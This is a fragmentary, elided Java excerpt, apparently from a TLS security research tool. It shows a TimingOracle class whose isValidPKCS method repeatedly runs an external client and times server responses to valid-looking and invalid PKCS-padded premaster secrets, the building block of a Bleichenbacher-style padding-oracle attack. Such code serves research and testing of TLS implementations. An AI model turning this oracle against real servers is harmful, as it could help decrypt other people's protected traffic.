...
import de.rub.nds.ssl.analyzer.attacker.misc.CommandLineWorkflowExecutor;
...
public class TimingOracle extends ATimingOracle {
    ...
    private boolean isValidPKCS(byte[] testPMS, int amountOfMeasurements) {
        ...
        CommandLineWorkflowExecutor clwe = new CommandLineWorkflowExecutor("./client ");
        for (int i = 0; i < amountOfMeasurements; i++) {
            try {
                measurementsTest[i] = clwe.executeClientWithPMS(testPMS);
//                executeWorkflow(testPMS, ESupportedSockets.TimingSocket);
//                measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
                measurementsInvalid[i] = clwe.executeClientWithPMS(encInvalidPKCS);
